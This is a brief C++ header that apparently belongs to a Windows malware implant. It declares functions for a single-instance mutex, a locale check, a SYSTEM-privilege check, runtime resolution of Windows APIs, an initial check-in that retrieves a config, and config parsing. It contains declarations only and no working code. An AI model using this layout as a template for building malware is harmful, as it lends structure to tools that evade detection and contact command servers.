#pragma once
#include "vars.h"
#include "functions.h"
#include "utils.h"
#include "comms.h"
#include "cleanup.h"

extern HANDLE g_hMutex;

// Initial checks
int createMutex();
int checkLocale();
bool isSystem();

// Resolving all Windows APIs
int loadModules(unordered_map<wstring, HMODULE>& mHandles);
int resolveFunctionPointers(unordered_map<wstring, HMODULE> mHandles);

// Getting the config
string conductInitialCheckin();
int parseConfig(unordered_map<wstring, vector<wstring>>& config, string rawConfig);
int parseConfig(unordered_map<wstring, vector<wstring>>& config, string rawConfig);
void setFolderPath();